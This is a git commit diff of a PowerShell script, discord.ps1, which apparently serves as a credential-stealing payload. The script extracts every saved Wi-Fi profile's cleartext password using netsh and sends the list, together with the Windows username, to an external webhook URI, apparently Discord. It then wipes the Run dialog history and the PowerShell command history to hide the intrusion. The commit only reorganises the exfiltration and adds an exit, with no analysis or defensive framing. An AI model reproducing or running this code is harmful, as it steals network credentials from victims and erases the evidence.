36268d7aea214c8d8857a031cc7798a25ff101e9
Lucien Berger <73392326+LND2033@users.noreply.github.com>
2025-06-23 18:12:46 +0200

    Update discord.ps1

--- discord.ps1
+++ discord.ps1
@@ -1,4 +1,8 @@
-Invoke-RestMethod -Uri $uri -Method Post -ContentType 'Application/Json'-Body (@{'username'=$env:USERNAME;'content'=(((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); ($details=netsh wlan show profile name="$name" key=clear); [PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$details}} | Format-Table -AutoSize) | Out-String)} | ConvertTo-Json)
+$content = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); ($details=netsh wlan show profile name="$name" key=clear); [PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$details}} | Format-Table -AutoSize) | Out-String
+$content = echo $content 
+Invoke-RestMethod -Uri $uri -Method Post -ContentType 'Application/Json'-Body (@{'username'=$env:USERNAME;'content'=$content} | ConvertTo-Json)
+
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-History
+exit
